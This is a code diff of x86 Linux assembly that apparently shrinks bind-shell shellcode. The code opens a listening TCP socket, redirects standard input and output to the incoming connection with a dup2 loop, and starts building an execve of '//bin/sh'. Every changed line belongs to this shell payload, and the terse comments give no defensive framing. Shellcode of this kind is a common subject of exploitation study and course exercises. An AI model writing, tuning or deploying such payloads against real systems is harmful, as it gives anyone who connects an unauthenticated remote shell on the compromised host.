@@ -14,19 +14,17 @@ _start:
     push 0x1
     push 0x2
     mov ecx, esp
-    mov bl,0x1
-    push 0x66
-    pop eax
+    inc ebx
+    mov al, 0x66
     int 0x80
     ;}
-    ; save socket FD in edx
+    ; save socket FD in edx; and eax has 0
     xchg edx, eax
 
     ;srv.sin_family=2;srv.sin_port = htons(0xD304);srv.sin_addr.s_addr=0;
     ;sockaddr struct
     ;{
 
-    pop ebx ;latest pushed value is 0x2, we're gonna need it for SYS_BIND
     push eax
     push word 0xD304
     push word 0x2
@@ -40,6 +38,7 @@ _start:
     push edx
     mov ecx, esp
     ;pop ebx already popped
+    inc ebx
     mov al,0x66
     int 0x80
     ;}
@@ -49,8 +48,7 @@ _start:
     push eax
     push edx
     mov ecx, esp
-    inc ebx
-    inc ebx
+    mov bl, 0x4
     mov al,0x66
     int 0x80
     ;}
@@ -66,16 +64,15 @@ _start:
     ;}
     ; save returned socket FD in ebx
     xchg ebx,eax ;now eax contains 5
-    lea edx,[eax-3]
+    mov dl, 0x2
     dup2loop:
     mov ecx, edx
-    push 0x3f
-    pop eax
+    mov al, 0x3f
     int 0x80
     dec edx
     jns dup2loop
 
-    mul ecx
+    inc edx
     push ecx
     push 0x68732f6e
     push 0x69622f2f
